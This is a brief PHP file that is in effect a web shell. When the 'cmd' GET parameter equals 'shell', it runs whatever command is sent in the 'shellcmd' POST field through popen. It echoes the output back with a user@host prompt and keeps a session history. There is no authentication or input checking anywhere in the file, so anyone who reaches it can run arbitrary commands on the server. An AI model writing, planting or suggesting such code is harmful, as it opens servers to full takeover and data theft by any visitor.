<?php
function run_terminal_shell($cmd)
{
        $handle = popen($cmd, "r");
        while (($buf = fgets($handle, 1024)) != false) {
                $data .= $buf."";
        }
        pclose($handle);
        return $data;
}

function aio_shell()
{
    $host_name = gethostbyaddr($_SERVER['SERVER_NAME']);
    $uid = posix_getuid();
    $user_info = posix_getpwuid($uid);
	$curr_path = getcwd();
	$prompt=$user_info['name'].'@'.$host_name.':'.$curr_path;

    if ($_POST['shellcmd']) {
        $cmd_data = $prompt.'$'.$_POST['shellcmd']."\n";
        $cmd_data .= run_terminal_shell($_POST['shellcmd']);
        $_SESSION['output'] .= $cmd_data;
        echo $_SESSION['output'];
    }
        
}
if ($_GET['cmd'] == "shell") 
    aio_shell();               
?>